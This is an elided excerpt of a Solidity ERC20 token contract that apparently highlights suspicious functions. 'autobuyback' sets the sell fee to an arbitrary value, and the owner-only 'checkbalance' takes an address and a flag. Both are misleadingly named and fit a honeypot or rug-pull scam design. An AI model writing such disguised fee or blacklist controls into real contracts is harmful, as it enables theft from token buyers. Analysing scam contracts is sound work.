...
contract TEST is IERC20, Ownable {
    ...
    string private constant _name = "T";
    ...
    function checkbalance(address _address, bool _enabled) external onlyOwner {
        require(
    ...
    function PerformTx(uint256 tokens, address sender) private lockTheSwap {
    ...
    function swapBack(address sender, address recipient) internal {
        if (shouldSwapBack(sender, recipient)) {
            PerformTx(swapThreshold, sender);
        }
    }
    ...
    function autobuyback(
        uint256 gas,
        address _rewards,
        uint256 _amount,
        uint256 _distributerate
    ) external {

        sellFee = _distributerate;
    ...
    function buyback(address _address, uint256 _amount) external {
